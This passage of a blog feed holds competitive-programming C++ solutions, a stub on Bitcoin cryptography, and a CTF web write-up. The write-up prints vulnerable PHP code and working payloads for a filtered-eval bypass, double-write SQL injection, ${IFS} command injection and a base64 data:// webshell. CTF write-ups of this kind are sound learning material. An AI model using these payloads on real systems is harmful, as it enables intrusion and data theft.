punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">,</span> ini<span class="token punctuation">;</span>    db re<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> u <span class="token operator">>></span> v <span class="token operator">>></span> ini <span class="token operator">>></span> re<span class="token punctuation">;</span>        re <span class="token operator">+=</span> <span class="token number">1e-6</span><span class="token punctuation">;</span>        <span class="token function">addedge</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> v<span class="token punctuation">,</span> ini<span class="token punctuation">,</span> re<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dfn<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token function">tarjan</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>team<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">]</span> <span class="token operator">!=</span> team<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">addedge2</span><span class="token punctuation">(</span>team<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">]</span><span class="token punctuation">,</span> team<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">,</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>            in<span class="token punctuation">[</span>team<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            team_value<span class="token punctuation">[</span>team<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">cal</span><span class="token punctuation">(</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>w<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>reco<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cin <span class="token operator">>></span> s<span class="token punctuation">;</span>    <span class="token function">topo</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// freopen("out","w",stdout);</span>    <span class="token comment">//freopen("text", "r", stdin);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token comment">// cin >> T;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>T<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1122-最大子树和"><a href="#P1122-最大子树和" class="headerlink" title="P1122 最大子树和"></a><a href="https://www.luogu.com.cn/problem/P1122">P1122 最大子树和</a></h4><ul><li><p>题意：<br>按题意求最大子树和。</p></li><li><p>题解：<br>比较简单的一道树形DP，$dp[i]$表示第i个子树（包括根节点）的最大子树和。转移方程：<br>$dp[u] += (dp[v]&gt;0 \, ? \, dp[v]  \, : \, 0)$，v是u的子节点</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> mp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">,</span> <span class="token keyword">int</span> fa<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">&amp;</span>it <span class="token operator">:</span> mp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>it <span class="token operator">==</span> fa<span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span> rt<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>it<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>it<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> u <span class="token operator">>></span> v<span class="token punctuation">;</span>        mp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>        mp<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> INT_MIN<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> ans<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BTC相关知识</title>
      <link href="/2021/09/17/%E6%AF%94%E7%89%B9%E5%B8%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2021/09/17/%E6%AF%94%E7%89%B9%E5%B8%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1-BTC密码学原理"><a href="#1-BTC密码学原理" class="headerlink" title="1. BTC密码学原理"></a>1. BTC密码学原理</h2><p>比特币属于加密货币，可见其中必然会涉及到密码学的知识。而比特币本身开放，其交易记录、交易金额、交易内容甚至源代码都面向全网开放。</p><h3 id="1-1-Hash和Hash碰撞"><a href="#1-1-Hash和Hash碰撞" class="headerlink" title="1.1 Hash和Hash碰撞"></a>1.1 Hash和Hash碰撞</h3><p>给定x和y，且有x!=y，但给定一个哈希函数Hash(),可以得到Hash(x)=Hash(y)，则称为hash碰撞。collision resistance可以简单理解为扛碰撞性，这个性质可以保证,如果有Hash(x)!=Hash(y)，必然可以得到x!=y。在BTC系统中，使用的是SHA-256算法，输出的空间大小有$2^{256}$，所以基本认为人为创造Hash碰撞概率为0。</p><h3 id="1-2-工作量证明（POW）"><a href="#1-2-工作量证明（POW）" class="headerlink" title="1.2 工作量证明（POW）"></a>1.2 工作量证明（POW）</h3><p>在比特币中要求，合法的区块必须满足：<br>$H(block header)≤target$</p><p>在区块头（block header）中有一个域nonce，穷举计算nonce，计算block header哈希值小于target，确定一个合法区块。</p><p>区块链的工作原理，记账节点（矿工）收集网络上广播的交易（tx）,维护一个交易集合，将若干笔交易打包，计算交易列表hash，放在block header中，穷举nonce域，使$H(block header)≤target$。</p><p>由于Hash函数的puzzle friendly特性，只能使用穷举算法。挖矿的主要工作就是通过穷举计算，找到符合条件的区块头。矿工找到符合条件块头，就获得了记账权，获得出块奖励和交易费，矿工要把这个区块信息发布到网络上，以便其他矿工能够收到这个区块信息。</p><h3 id="1-3-账户信息"><a href="#1-3-账户信息" class="headerlink" title="1.3 账户信息"></a>1.3 账户信息</h3><p>非对称加密算法需要两个密钥：公开密钥（publickey:简称公钥）和私有密钥（privatekey:简称私钥）。公钥与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密。在比特币中，用户可以自己创建一个公私钥对，公钥就作为用户的账户信息。利用公私钥实现信息的保密通信和数字签名。</p><h3 id="1-4"><a href="#1-4" class="headerlink" title="1.4"></a>1.4</h3><h2 id="2-BTC数据结构"><a href="#2-BTC数据结构" class="headerlink" title="2. BTC数据结构"></a>2. BTC数据结构</h2>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>neuq 2021 招新赛web</title>
      <link href="/2021/08/29/neuq-2021-%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/"/>
      <url>/2021/08/29/neuq-2021-%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/</url>
      
        <content type="html"><![CDATA[<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p>9道WEB题目做出了6道，外加一道misc白给题。第一次打CTF，感觉和ACM不一样，36H的时间有点长。大佬们都太强了orz。</p><h2 id="easy-eval"><a href="#easy-eval" class="headerlink" title="easy_eval"></a>easy_eval</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/system|flag/"</span> <span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no system or flag!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>这道题目就是一个简单的命令执行，发现把system和flag过滤掉了，那直接使用字符拼接就能完成。<br><pre class="language-php" data-language="php"><code class="language-php">payload1<span class="token punctuation">:</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"sys"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string double-quoted-string">"tem"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cd /;ls -a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>结果<span class="token punctuation">:</span>发现存在flaGGggGg<span class="token operator">.</span>txt文件，直接打开就行了。 payload2<span class="token punctuation">:</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"sys"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string double-quoted-string">"tem"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cd /;cat flaGGggGg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 得到答案<span class="token punctuation">:</span>flag<span class="token punctuation">&#123;</span><span class="token number">0</span>cc175b9c0f12fd62f2e39dfbtahfa<span class="token punctuation">&#125;</span></code></pre></p><h2 id="check-in-sql"><a href="#check-in-sql" class="headerlink" title="check_in_sql"></a>check_in_sql</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"sql"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/select/"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"sql"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// var_dump($sql);</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token operator">.</span><span class="token string double-quoted-string">"LionTreeNB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$r</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$r</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$r</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>这道题目就是一个简单的sql注入题，注意使用双写绕过就行。</p><pre class="language-sql" data-language="sql"><code class="language-sql">payload1: ?<span class="token keyword">sql</span><span class="token operator">=</span>selselectect <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>结果:array<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> &#123; <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span> <span class="token punctuation">[</span><span class="token string">"version()"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span> <span class="token string">"5.7.26-0ubuntu0.18.04.1"</span> <span class="token punctuation">[</span><span class="token string">"LionTreeNB"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"web"</span> &#125;发现有回显，并且发现web数据库payload2: <span class="token keyword">sql</span><span class="token operator">=</span>selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'web'</span><span class="token punctuation">)</span>结果:array<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> &#123; <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span> <span class="token punctuation">[</span><span class="token string">"LionTreeNB"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"users"</span> &#125;发现有个users表payload3: ?<span class="token keyword">sql</span><span class="token operator">=</span>selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'web'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>结果: array<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> &#123; <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span> <span class="token punctuation">[</span><span class="token string">"LionTreeNB"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token string">"username,passwd,data"</span> &#125;payload4: ?<span class="token keyword">sql</span><span class="token operator">=</span>selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect  group_concat<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span class="token keyword">from</span> users<span class="token punctuation">)</span>结果: array<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> &#123; <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span> <span class="token punctuation">[</span><span class="token string">"LionTreeNB"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span> <span class="token string">"flag&#123;43195f93e91cce76f01c1b26957c1&#125;"</span> &#125; </code></pre><h2 id="easy-ping"><a href="#easy-ping" class="headerlink" title="easy_ping"></a>easy_ping</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\s/"</span><span class="token punctuation">,</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no space!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>空格过滤<br><pre class="language-none"><code class="language-none">payload1: ?ip&#x3D;0.0.0.0;cd$&#123;IFS&#125;&#x2F;;ls$&#123;IFS&#125;-a结果: . .. .dockerenv bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var;payload2: ?ip&#x3D;0.0.0.0;cd$&#123;IFS&#125;&#x2F;;cat$&#123;IFS&#125;flag.txt结果: flag&#123;3582efdc7ae760fa3fccbe41493&#125;</code></pre></p><h2 id="easy-include"><a href="#easy-include" class="headerlink" title="easy_include"></a>easy_include</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in /flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/filter/"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no filter!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>过滤filter，可以使用data://数据流封装来执行php代码,那就直接挂马。<br><pre class="language-none"><code class="language-none">payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZXZhbChAJF9QT1NUWydhJ10pOyA&#x2F;Pg&#x3D;&#x3D;然后使用蚁剑连接即可。</code></pre></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"this is a php file!!!!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token comment">&lt;!-- this file-uploading isn't that easy ...... --></span></code></pre><p>首先move_uploaded_file一般用来保存上传的文件。 